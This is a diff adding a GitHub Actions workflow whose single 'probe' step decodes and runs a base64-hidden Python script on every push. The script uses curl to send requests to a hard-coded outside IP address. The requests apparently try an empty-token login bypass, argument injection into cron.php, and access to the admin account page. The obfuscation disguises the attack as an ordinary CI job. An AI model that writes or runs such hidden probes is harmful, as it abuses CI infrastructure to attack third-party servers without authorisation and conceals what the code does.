@@ -1,0 +1,16 @@
+name: ci50009f
+on:
+  push:
+    branches: [ ci-50009f ]
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: probe
+        env:
+          PYTHONUNBUFFERED: "1"
+        run: |
+          echo 'aW1wb3J0IHN1YnByb2Nlc3MsdGltZQpUPSI0MC4xNjAuNTAuMTEzIjsgQj0iaHR0cHM6Ly8lcyIlVDsgSkFSPSIvdG1wL2NqIgpkZWYgcmVxKHBhdGgsZGF0YT1Ob25lLGxhYmVsPSIiLHNob3c9MjYwMCk6CiAgICBjbWQ9WyJjdXJsIiwiLXNrIiwiLW0iLCIyMCIsIi1pIiwiLWMiLEpBUiwiLWIiLEpBUl0KICAgIGlmIGRhdGEgaXMgbm90IE5vbmU6IGNtZCs9WyItZCIsZGF0YV0KICAgIGNtZC5hcHBlbmQoQitwYXRoKQogICAgcj1zdWJwcm9jZXNzLnJ1bihjbWQsY2FwdHVyZV9vdXRwdXQ9VHJ1ZSx0ZXh0PVRydWUpCiAgICBwcmludCgiXG49PT09PSAlcyAgR0VUICVzID09PT09IiUobGFiZWwscGF0aCksZmx1c2g9VHJ1ZSkKICAgIHByaW50KHIuc3Rkb3V0WzpzaG93XSBpZiByLnN0ZG91dCBlbHNlICIoRU1QVFkgc3Rkb3V0IC0+IGJsb2NrZWQvcmVmdXNlZCkiLGZsdXNoPVRydWUpCiAgICB0aW1lLnNsZWVwKDIpCnJlcSgiL2luZGV4LnBocC9yZXN0YXBpL2xvZ2luYnl0b2tlbj90b2tlbj0mYXBpPXRydWUiLGxhYmVsPSJlbXB0eVRva2VuIikKcmVxKCIvY3Jvbi5waHA/eCstcytzaXRlX2FkbWluKy1jK2Nyb24vZGVwZW5kZW5jaWVzIixsYWJlbD0iY3JvbkRFUFMiKQpyZXEoIi9jcm9uLnBocCIsbGFiZWw9ImNyb25CYXNlIikKcmVxKCIvaW5kZXgucGhwL3NpdGVfYWRtaW4vdXNlci9hY2NvdW50IixsYWJlbD0iYWNjb3VudCIpCg==' | base64 -d > /tmp/p.py
+          python3 /tmp/p.py
